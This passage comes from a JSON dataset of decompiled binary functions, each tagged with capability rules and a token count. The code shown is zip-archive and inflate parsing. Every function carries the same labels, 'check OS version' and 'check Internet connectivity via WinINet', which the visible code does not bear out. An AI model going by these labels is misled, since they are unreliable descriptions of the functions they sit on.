0x18;\n                arg_8h = 0;\n                *in_EAX = *in_EAX + 1;\n                *in_EAX[7] = 9;\n            case 9:\n                if (in_EAX[1] == NULL) {\n                    return arg_8h;\n                }\n                in_EAX[2] = in_EAX[2] + 1;\n                in_EAX[1] = in_EAX[1] + -1;\n                *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX * 0x10000;\n                arg_8h = 0;\n                *in_EAX = *in_EAX + 1;\n                *in_EAX[7] = 10;\ncode_r0x0040c11d:\n                if (in_EAX[1] == NULL) {\n                    return arg_8h;\n                }\n                in_EAX[2] = in_EAX[2] + 1;\n                in_EAX[1] = in_EAX[1] + -1;\n                *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX * 0x100;\n                arg_8h = 0;\n                *in_EAX = *in_EAX + 1;\n                *in_EAX[7] = 0xb;\ncode_r0x0040c14a:\n                if (in_EAX[1] == NULL) {\n                    return arg_8h;\n                }\n                in_EAX[2] = in_EAX[2] + 1;\n                in_EAX[1] = in_EAX[1] + -1;\n                *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX;\n                puVar3 = in_EAX[7];\n                *in_EAX = *in_EAX + 1;\n                if (puVar3[1] == puVar3[2]) {\n                    *in_EAX[7] = 0xc;\ncode_r0x0040c29f:\n                    return 1;\n                }\n                *puVar3 = 0xd;\n                in_EAX[6] = \"incorrect data check\";\ncode_r0x0040c183:\n                arg_8h = 0;\n                *(in_EAX[7] + 4) = 5;\n                break;\n            case 10:\n                goto code_r0x0040c11d;\n            case 0xb:\n                goto code_r0x0040c14a;\n            case 0xc:\n                goto code_r0x0040c29f;\n            case 0xd:\n                return -3;\n            default:\n                goto code_r0x0040c19b;\n            }\n            uVar2 = *in_EAX[7];\n        } while( true );\n    }\ncode_r0x0040c19b:\n    return -2;\n}\n",
        "token_count": 2238
    },
    "0040c2f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c2f0(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    uint32_t arg_10h;\n    char *unaff_EDI;\n    \n    arg_10h = unaff_EBX * arg_ch;\n    if (*unaff_EDI != '\\0') {\n        iVar1 = (**0x4574dc)(*(unaff_EDI + 4), arg_8h, arg_10h, &arg_ch, 0);\n        if (iVar1 == 0) {\n            unaff_EDI[8] = '\\x01';\n        }\n        return arg_ch / unaff_EBX;\n    }\n    iVar1 = *(unaff_EDI + 0x1c);\n    if (*(unaff_EDI + 0x18) < iVar1 + arg_10h) {\n        arg_10h = *(unaff_EDI + 0x18) - iVar1;\n    }\n    fcn.0042f700(arg_8h, *(unaff_EDI + 0x14) + iVar1, arg_10h);\n    *(unaff_EDI + 0x1c) = *(unaff_EDI + 0x1c) + arg_10h;\n    return arg_10h / unaff_EBX;\n}\n",
        "token_count": 302
    },
    "0040c360": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c360(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    char *unaff_ESI;\n    int32_t iVar2;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar2 = 1;\n    if (*unaff_ESI == '\\0') {\n        iVar1 = *(unaff_ESI + 0x1c);\n        if (*(unaff_ESI + 0x18) < iVar1 + 1U) {\n            iVar2 = *(unaff_ESI + 0x18) - iVar1;\n        }\n        fcn.0042f700(&var_1h, *(unaff_ESI + 0x14) + iVar1, iVar2);\n        *(unaff_ESI + 0x1c) = iVar1 + iVar2;\n        var_8h = iVar2;\n    }\n    else {\n        iVar2 = (**0x4574dc)(*(unaff_ESI + 4), &var_1h, 1, &var_8h, 0);\n        if (iVar2 == 0) {\n            unaff_ESI[8] = '\\x01';\n        }\n    }\n    if (var_8h == 1) {\n        *arg_8h = var_1h;\n    }\n    else if ((*unaff_ESI != '\\0') && (unaff_ESI[8] != '\\0')) {\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 361
    },
    "0040c510": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040c510(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *unaff_ESI;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (*unaff_ESI == '\\0') {\n        *(unaff_ESI + 0x1c) = *(unaff_ESI + 0x18);\n    }\n    else {\n        if (unaff_ESI[1] == '\\0') {\n            return -1;\n        }\n        (**0x4573d0)(*(unaff_ESI + 4), 0, 0, 2);\n    }\n    if (*unaff_ESI == '\\0') {\n        var_4h = *(unaff_ESI + 0x1c);\n    }\n    else if (unaff_ESI[1] == '\\0') {\n        var_4h = 0;\n    }\n    else {\n        iVar2 = (**0x4573d0)(*(unaff_ESI + 4), 0, 0, 1);\n        var_4h = iVar2 - *(unaff_ESI + 0xc);\n    }\n    uVar6 = var_4h;\n    var_8h = 0xffff;\n    if (var_4h < 0xffff) {\n        var_8h = var_4h;\n    }\n    uVar5 = var_8h;\n    var_10h = fcn.0042d6d0(0x404);\n    if (var_10h == 0) {\n        return -1;\n    }\n    var_14h = -1;\n    uVar3 = 4;\n    if (uVar5 < 5) {\ncode_r0x0040c6bd:\n        fcn.0042d696(var_10h);\n        return var_14h;\n    }\n    do {\n        var_ch = uVar5;\n        if (uVar3 + 0x400 <= uVar5) {\n            var_ch = uVar3 + 0x400;\n        }\n        iVar2 = uVar6 - var_ch;\n        uVar6 = uVar6 - iVar2;\n        if (0x404 < uVar6) {\n            uVar6 = 0x404;\n        }\n        if (*unaff_ESI == '\\0') {\n            *(unaff_ESI + 0x1c) = iVar2;\n        }\n        else {\n            if (unaff_ESI[1] == '\\0') goto code_r0x0040c6bd;\n            (**0x4573d0)(*(unaff_ESI + 4), *(unaff_ESI + 0xc) + iVar2, 0, 0);\n        }\n        if (*unaff_ESI == '\\0') {\n            iVar4 = *(unaff_ESI + 0x1c);\n            uVar5 = uVar6;\n            if (*(unaff_ESI + 0x18) < iVar4 + uVar6) {\n                uVar5 = *(unaff_ESI + 0x18) - iVar4;\n            }\n            fcn.0042f700(var_10h, *(unaff_ESI + 0x14) + iVar4, uVar5);\n            *(unaff_ESI + 0x1c) = *(unaff_ESI + 0x1c) + uVar5;\n        }\n        else {\n            iVar4 = (**0x4574dc)(*(unaff_ESI + 4), var_10h, uVar6, &var_18h, 0);\n            uVar5 = var_18h;\n            if (iVar4 == 0) {\n                unaff_ESI[8] = '\\x01';\n            }\n        }\n        if (uVar5 / uVar6 != 1) goto code_r0x0040c6bd;\n        iVar4 = uVar6 - 3;\n        do {\n            iVar1 = iVar4;\n            if (iVar1 < 0) goto code_r0x0040c6ab;\n            iVar4 = iVar1 + -1;\n        } while ((((*(iVar4 + var_10h) != 'P') || (*(iVar1 + var_10h) != 'K')) || (*(iVar1 + 1 + var_10h) != '\\x05')) ||\n                (*(iVar1 + 2 + var_10h) != '\\x06'));\n        var_14h = iVar4 + iVar2;\ncode_r0x0040c6ab:\n        if ((var_14h != 0) || (uVar3 = var_ch,  uVar6 = var_4h,  uVar5 = var_8h,  var_8h <= var_ch))\n        goto code_r0x0040c6bd;\n    } while( true );\n}\n",
        "token_count": 1135
    },
    "0040c6e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * fcn.0040c6e0(void)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (in_EAX == NULL) {\n        return NULL;\n    }\n    iVar4 = 0;\n    var_90h = 0;\n    fcn.00434d30(&var_8ch, 0, 0x7c);\n    var_10h = fcn.0040c510();\n    if (var_10h != -1) {\n        if (*in_EAX == '\\0') {\n            *(in_EAX + 0x1c) = var_10h;\n        }\n        else {\n            if (in_EAX[1] == '\\0') goto code_r0x0040c74d;\n            (**0x4573d0)(*(in_EAX + 4), *(in_EAX + 0xc) + var_10h, 0, 0);\n        }\n        iVar1 = fcn.0040c440();\n        if (iVar1 == 0) goto code_r0x0040c750;\n    }\ncode_r0x0040c74d:\n    iVar4 = -1;\ncode_r0x0040c750:\n    var_4h = 0;\n    if ((iVar4 == 0) && (iVar1 = fcn.0040c3f0(),  iVar1 != 0)) {\n        iVar4 = -1;\n    }\n    var_ch = 0;\n    if ((iVar4 == 0) && ((iVar1 = fcn.0040c3f0(),  iVar1 != 0 || (iVar1 = fcn.0040c3f0(),  iVar1 != 0)))) {\n        iVar4 = -1;\n    }\n    var_8h = 0;\n    if ((((((iVar4 == 0) && (iVar4 = fcn.0040c3f0(),  iVar4 == 0)) && (var_8h == var_8ch)) &&\n         ((var_ch == 0 && (var_4h == 0)))) &&\n        ((iVar4 = fcn.0040c440(),  iVar4 == 0 &&\n         ((iVar4 = fcn.0040c440(),  iVar4 == 0 && (iVar4 = fcn.0040c3f0(),  iVar4 == 0)))))) &&\n       (var_70h + var_6ch <= *(in_EAX + 0xc) + var_10h)) {\n        var_84h = ((*(in_EAX + 0xc) - var_70h) - var_6ch) + var_10h;\n        var_74h = var_10h;\n        var_14h = 0;\n        *(in_EAX + 0xc) = 0;\n        puVar2 = fcn.0042d6d0(0x80);\n        puVar3 = &var_90h;\n        puVar5 = puVar2;\n        for (iVar4 = 0x20; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        fcn.0040cc80();\n        return puVar2;\n    }\n    if (in_EAX[0x10] != '\\0') {\n        (**0x4573b8)(*(in_EAX + 4));\n    }\n    fcn.0042d62b();\n    return NULL;\n}\n",
        "token_count": 916
    },
    "0040c880": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c880(uint *arg_8h, int32_t *arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    char *pcVar1;\n    char **in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (in_EAX == NULL) {\n        return -0x66;\n    }\n    pcVar1 = *in_EAX;\n    if (*pcVar1 == '\\0') {\n        *(pcVar1 + 0x1c) = in_EAX[5] + in_EAX[3];\ncode_r0x0040c8cc:\n        iVar2 = fcn.0040c440();\n        if (iVar2 == 0) {\n            if (var_8h != 0x2014b50) {\n                var_4h = -0x67;\n            }\n            goto code_r0x0040c8f3;\n        }\n    }\n    else if (pcVar1[1] != '\\0') {\n        (**0x4573d0)(*(pcVar1 + 4), in_EAX[5] + in_EAX[3] + *(pcVar1 + 0xc), 0, 0);\n        goto code_r0x0040c8cc;\n    }\n    var_4h = -1;\ncode_r0x0040c8f3:\n    iVar2 = fcn.0040c360(&var_8h);\n    var_58h = var_8h;\n    if ((iVar2 == 0) && (iVar2 = fcn.0040c360(&var_8h),  iVar2 == 0)) {\n        var_58h = var_8h * 0x100 + var_58h;\n    }\n    else {\n        var_58h = 0;\n        if (iVar2 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar2 = fcn.0040c360(&var_8h);\n    var_54h = var_8h;\n    if ((iVar2 == 0) && (iVar2 = fcn.0040c360(&var_8h),  iVar2 == 0)) {\n        var_54h = var_8h * 0x100 + var_54h;\n    }\n    else {\n        var_54h = 0;\n        if (iVar2 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar2 = fcn.0040c360(&var_8h);\n    var_50h = var_8h;\n    if ((iVar2 == 0) && (iVar2 = fcn.0040c360(&var_8h),  iVar2 == 0)) {\n        var_50h = var_8h * 0x100 + var_50h;\n    }\n    else {\n        var_50h = 0;\n        if (iVar2 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar2 = fcn.0040c360(&var_8h);\n    var_4ch = var_8h;\n    if ((iVar2 == 0) && (iVar2 = fcn.0040c360(&var_8h),  iVar2 == 0)) {\n        var_4ch = var_8h * 0x100 + var_4ch;\n    }\n    else {\n        var_4ch = 0;\n        if (iVar2 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar2 = fcn.0040c440();\n    if (iVar2 != 0) {\n        var_4h = -1;\n    }\n    var_14h = var_48h >> 0x10 & 0x1f;\n    var_ch = (var_48h >> 0x19) + 0x7bc;\n    var_10h = (var_48h >> 0x15 & 0xf) - 1;\n    var_18h = var_48h >> 0xb & 0x1f;\n    var_1ch = var_48h >> 5 & 0x3f;\n    var_20h = (var_48h & 0x1f) * 2;\n    iVar2 = fcn.0040c440();\n    if (iVar2 != 0) {\n        var_4h = -1;\n    }\n    iVar2 = fcn.0040c440();\n    if (iVar2 != 0) {\n        var_4h = -1;\n    }\n    iVar2 = fcn.0040c440();\n    if (iVar2 != 0) {\n        var_4h = -1;\n    }\n    iVar3 = fcn.0040c360(&var_8h);\n    iVar2 = var_8h;\n    if ((iVar3 == 0) && (iVar3 = fcn.0040c360(&var_8h),  iVar3 == 0)) {\n        var_38h = var_8h * 0x100 + iVar2;\n    }\n    else {\n        var_38h = 0;\n        if (iVar3 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar2 = fcn.0040c360(&var_8h);\n    var_34h = var_8h;\n    if ((iVar2 == 0) && (iVar2 = fcn.0040c360(&var_8h),  iVar2 == 0)) {\n        var_34h = var_8h * 0x100 + var_34h;\n    }\n    else {\n        var_34h = 0;\n        if (iVar2 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar2 = fcn.0040c360(&var_8h);\n    var_30h = var_8h;\n    if ((iVar2 == 0) && (iVar2 = fcn.0040c360(&var_8h),  iVar2 == 0)) {\n        var_30h = var_8h * 0x100 + var_30h;\n    }\n    else {\n        var_30h = 0;\n        if (iVar2 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar2 = fcn.0040c360(&var_8h);\n    var_2ch = var_8h;\n    if ((iVar2 == 0) && (iVar2 = fcn.0040c360(&var_8h),  iVar2 == 0)) {\n        var_2ch = var_8h * 0x100 + var_2ch;\n    }\n    else {\n        var_2ch = 0;\n        if (iVar2 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar2 = fcn.0040c360(&var_8h);\n    var_28h = var_8h;\n    if ((iVar2 == 0) && (iVar2 = fcn.0040c360(&var_8h),  iVar2 == 0)) {\n        var_28h = var_8h * 0x100 + var_28h;\n    }\n    else {\n        var_28h = 0;\n        if (iVar2 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar2 = fcn.0040c440();\n    if (iVar2 != 0) {\n        var_4h = -1;\n    }\n    iVar2 = fcn.0040c440();\n    if (iVar2 != 0) {\n        return -1;\n    }\n    if (var_4h == 0) {\n        if (arg_10h != 0) {\n            if (var_38h < arg_14h) {\n                *(var_38h + arg_10h) = 0;\n            }\n            if (((var_38h != 0) && (arg_14h != 0)) && (iVar2 = fcn.0040c2f0(arg_10h, 1),  iVar2 != 1)) {\n                return -1;\n            }\n        }\n        if (arg_8h != NULL) {\n            puVar4 = &var_58h;\n            for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *arg_8h = *puVar4;\n                puVar4 = puVar4 + 1;\n                arg_8h = arg_8h + 1;\n            }\n        }\n        if (arg_ch != NULL) {\n            *arg_ch = var_8h;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2166
    },
    "0040ccc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_114h\n\nvoid __cdecl fcn.0040ccc0(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint arg_8h_00;\n    uint uVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t in_ECX;\n    uint8_t *unaff_EDI;\n    bool bVar6;\n    uint var_114h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    if (in_ECX != 0) {\n        puVar3 = unaff_EDI;\n        do {\n            uVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n        } while (uVar1 != 0);\n        if (puVar3 - (unaff_EDI + 1) < 0x100) {\n            if (*(in_ECX + 0x18) == 0) {\n                fcn.0042d636(var_114h);\n                return;\n            }\n            arg_8h_00 = *(in_ECX + 0x14);\n            uVar2 = *(in_ECX + 0x10);\n            iVar4 = fcn.0040cc80();\n            while (iVar4 == 0) {\n                fcn.0040c880(0, 0, &var_110h, 0x100);\n                if (arg_8h == 1) {\n                    puVar5 = &var_110h;\n                    puVar3 = unaff_EDI;\n                    do {\n                        uVar1 = *puVar5;\n                        bVar6 = uVar1 < *puVar3;\n                        if (uVar1 != *puVar3) {\ncode_r0x0040cd88:\n                            iVar4 = (1 - bVar6) - (bVar6 != 0);\n                            goto code_r0x0040cd9c;\n                        }\n                        if (uVar1 == 0) break;\n                        uVar1 = *(puVar5 + 1);\n                        bVar6 = uVar1 < puVar3[1];\n                        if (uVar1 != puVar3[1]) goto code_r0x0040cd88;\n                        puVar5 = puVar5 + 2;\n                        puVar3 = puVar3 + 2;\n                    } while (uVar1 != 0);\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = fcn.0040c4c0();\n                }\ncode_r0x0040cd9c:\n                if (iVar4 == 0) {\n                    fcn.0042d636(arg_8h_00);\n                    return;\n                }\n                if ((*(in_ECX + 0x18) == 0) || (iVar4 = *(in_ECX + 0x10) + 1,  iVar4 == *(in_ECX + 4))) break;\n                *(in_ECX + 0x10) = iVar4;\n                *(in_ECX + 0x14) = *(in_ECX + 0x14) + *(in_ECX + 0x50) + *(in_ECX + 0x4c) + 0x2e + *(in_ECX + 0x48);\n                iVar4 = fcn.0040c880(in_ECX + 0x28, in_ECX + 0x78, 0, 0);\n                *(in_ECX + 0x18) = iVar4 == 0;\n            }\n            *(in_ECX + 0x10) = uVar2;\n            *(in_ECX + 0x14) = arg_8h_00;\n            fcn.0042d636(arg_8h_00);\n            return;\n        }\n    }\n    fcn.0042d636(var_114h);\n    return;\n}\n",
        "token_count": 881
    },
    "0040ce20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.0040ce20(char **arg_8h, char **arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char **unaff_EDI;\n    uint32_t var_ch;\n    char *var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = NULL;\n    pcVar6 = unaff_EDI[3];\n    pcVar2 = unaff_EDI[0x1e];\n    *arg_ch = NULL;\n    pcVar3 = *unaff_EDI;\n    cVar1 = *pcVar3;\n    var_4h = 0;\n    *arg_10h = 0;\n    if (cVar1 == '\\0') {\n        *(pcVar3 + 0x1c) = pcVar6 + pcVar2;\n    }\n    else {\n        if (pcVar3[1] == '\\0') {\n            return -1;\n        }\n        (**0x4573d0)(*(pcVar3 + 4), pcVar6 + pcVar2 + *(pcVar3 + 0xc), 0, 0);\n    }\n    iVar4 = fcn.0040c440();\n    if (iVar4 == 0) {\n        if (var_ch != 0x4034b50) {\n            var_4h = -0x67;\n        }\n    }\n    else {\n        var_4h = -1;\n    }\n    iVar4 = fcn.0040c360(&var_ch);\n    if (iVar4 == 0) {\n        iVar4 = fcn.0040c360(&var_ch);\n        if (iVar4 != 0) goto code_r0x0040cec6;\n    }\n    else {\ncode_r0x0040cec6:\n        var_4h = -1;\n    }\n    iVar5 = fcn.0040c360(&var_ch);\n    iVar4 = var_ch;\n    if (iVar5 == 0) {\n        iVar5 = fcn.0040c360(&var_ch);\n        if (iVar5 != 0) goto code_r0x0040ceff;\n        var_ch = var_ch * 0x100 + iVar4;\n    }\n    else {\ncode_r0x0040ceff:\n        var_ch = 0;\n        if (iVar5 != 0) {\n            var_4h = -1;\n        }\n    }\n    iVar5 = fcn.0040c360(&var_8h);\n    iVar4 = var_8h;\n    if (iVar5 == 0) {\n        iVar5 = fcn.0040c360(&var_8h);\n        if (iVar5 != 0) goto code_r0x0040cf85;\n        var_8h = var_8h * 0x100 + iVar4;\ncode_r0x0040cf41:\n        if ((var_4h == 0) && ((pcVar6 = unaff_EDI[0xd],  var_8h != pcVar6 || ((pcVar6 != NULL && (pcVar6 != 0x8)))))) {\n            var_4h = -0x67;\n        }\n    }\n    else {\ncode_r0x0040cf85:\n        var_8h = NULL;\n        if (iVar5 == 0) goto code_r0x0040cf41;\n        var_4h = -1;\n    }\n    iVar4 = fcn.0040c440();\n    if (iVar4 != 0) {\n        var_4h = -1;\n    }\n    iVar4 = fcn.0040c440();\n    if (iVar4 == 0) {\n        if (((var_4h == 0) && (var_8h != unaff_EDI[0xf])) && ((var_ch & 8) == 0)) {\n            var_4h = -0x67;\n        }\n    }\n    else {\n        var_4h = -1;\n    }\n    iVar4 = fcn.0040c440();\n    if (iVar4 == 0) {\n        if (((var_4h == 0) && (var_8h != unaff_EDI[0x10])) && ((var_ch & 8) == 0)) {\n            var_4h = -0x67;\n        }\n    }\n    else {\n        var_4h = -1;\n    }\n    iVar4 = fcn.0040c440();\n    if (iVar4 == 0) {\n        if (((var_4h == 0) && (var_8h != unaff_EDI[0x11])) && ((var_ch & 8) == 0)) {\n            var_4h = -0x67;\n        }\n    }\n    else {\n        var_4h = -1;\n    }\n    iVar4 = fcn.0040c360(&var_ch);\n    var_8h = var_ch;\n    if (iVar4 == 0) {\n        iVar4 = fcn.0040c360(&var_ch);\n        if (iVar4 != 0) goto code_r0x0040d089;\n        pcVar6 = var_ch * 0x100 + var_8h;\ncode_r0x0040d03f:\n        if ((var_4h == 0) && (pcVar6 != unaff_EDI[0x12])) {\n            var_4h = -0x67;\n        }\n    }\n    else {\ncode_r0x0040d089:\n        pcVar6 = NULL;\n        if (iVar4 == 0) goto code_r0x0040d03f;\n        var_4h = -1;\n    }\n    *arg_8h = *arg_8h + pcVar6;\n    iVar4 = fcn.0040c360(&var_ch);\n    var_8h = var_ch;\n    if (iVar4 == 0) {\n        iVar4 = fcn.0040c360(&var_ch);\n        if (iVar4 == 0) {\n            iVar5 = var_ch * 0x100 + var_8h;\n            goto code_r0x0040d0a5;\n        }\n    }\n    iVar5 = 0;\n    if (iVar4 != 0) {\n        var_4h = -1;\n    }\ncode_r0x0040d0a5:\n    *arg_ch = unaff_EDI[0x1e] + 0x1e + pcVar6;\n    *arg_10h = iVar5;\n    *arg_8h = *arg_8h + iVar5;\n    return var_4h;\n}\n",
        "token_count": 1497
    },
    "0040d240": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d240(int32_t arg_8h, uchar *arg_ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    uchar uVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint32_t in_ECX;\n    uint32_t uVar10;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n    }\n    if ((in_EAX == 0) || (piVar3 = *(in_EAX + 0x7c),  piVar3 == NULL)) {\n        return -0x66;\n    }\n    if (*piVar3 == 0) {\n        return -100;\n    }\n    if (in_ECX == 0) {\n        return 0;\n    }\n    piVar3[4] = arg_8h;\n    piVar3[5] = in_ECX;\n    if (piVar3[0x17] < in_ECX) {\n        piVar3[5] = piVar3[0x17];\n    }\n    if (piVar3[5] != 0) {\n        do {\n            if ((piVar3[2] == 0) && (uVar10 = piVar3[0x16],  uVar10 != 0)) {\n                uVar7 = 0x4000;\n                if ((uVar10 < 0x4000) && (uVar7 = uVar10,  uVar10 == 0)) {\n                    if (arg_ch == NULL) {\n                        return 0;\n                    }\n                    *arg_ch = 1;\n                    return 0;\n                }\n                pcVar4 = piVar3[0x18];\n                if (*pcVar4 == '\\0') {\n                    *(pcVar4 + 0x1c) = piVar3[0x1a] + piVar3[0xf];\n                }\n                else {\n                    if (pcVar4[1] == '\\0') {\n                        return -1;\n                    }\n                    (**0x4573d0)(*(pcVar4 + 4), *(pcVar4 + 0xc) + piVar3[0x1a] + piVar3[0xf], 0, 0);\n                }\n                iVar6 = fcn.0040c2f0(*piVar3, 1);\n                if (iVar6 != 1) {\n                    return -1;\n                }\n                iVar6 = *piVar3;\n                piVar3[0xf] = piVar3[0xf] + uVar7;\n                piVar3[0x16] = piVar3[0x16] - uVar7;\n                piVar3[1] = iVar6;\n                piVar3[2] = uVar7;\n                if ((*(piVar3 + 0x1b) != '\\0') && (uVar10 = 0,  uVar7 != 0)) {\n                    do {\n                        uVar5 = fcn.0040bc20();\n                        *(uVar10 + iVar6) = uVar5;\n                        uVar10 = uVar10 + 1;\n                    } while (uVar10 < uVar7);\n                }\n            }\n            uVar10 = piVar3[2];\n            uVar7 = piVar3[0x1f];\n            if (uVar10 < piVar3[0x1f]) {\n                uVar7 = uVar10;\n            }\n            if (uVar7 != 0) {\n                cVar2 = *(piVar3[1] + uVar7 + -1);\n                piVar3[0x17] = piVar3[0x17] - uVar7;\n                piVar1 = piVar3 + 0x1f;\n                *piVar1 = *piVar1 - uVar7;\n                piVar3[2] = uVar10 - uVar7;\n                piVar3[1] = piVar3[1] + uVar7;\n                if ((*piVar1 == 0) && (cVar2 != *(piVar3 + 0x20))) {\n                    return -0x6a;\n                }\n            }\n            if (piVar3[0x19] == 0) {\n                uVar10 = piVar3[2];\n                if (piVar3[5] < piVar3[2]) {\n                    uVar10 = piVar3[5];\n                }\n                uVar7 = 0;\n                if (uVar10 != 0) {\n                    do {\n                        *(uVar7 + piVar3[4]) = *(uVar7 + piVar3[1]);\n                        uVar7 = uVar7 + 1;\n                    } while (uVar7 < uVar10);\n                }\n                iVar6 = piVar3[4];\n                iVar8 = fcn.0040bad0();\n                piVar3[0x17] = piVar3[0x17] - uVar10;\n                piVar3[2] = piVar3[2] - uVar10;\n                piVar3[5] = piVar3[5] - uVar10;\n                piVar3[1] = piVar3[1] + uVar10;\n                piVar3[6] = piVar3[6] + uVar10;\n                var_4h = var_4h + uVar10;\n                piVar3[0x14] = iVar8;\n                piVar3[4] = iVar6 + uVar10;\n                if ((piVar3[0x17] == 0) && (arg_ch != NULL)) {\n                    *arg_ch = 1;\n                }\n            }\n            else {\n                iVar6 = piVar3[6];\n                var_8h = fcn.0040bf50();\n                iVar8 = piVar3[6];\n                iVar9 = fcn.0040bad0();\n                piVar3[0x17] = piVar3[0x17] - (iVar8 - iVar6);\n                var_4h = var_4h + (iVar8 - iVar6);\n                piVar3[0x14] = iVar9;\n                if ((var_8h == 1) || (piVar3[0x17] == 0)) {\n                    if (arg_ch == NULL) {\n                        return var_4h;\n                    }\n                    *arg_ch = 1;\n                    return 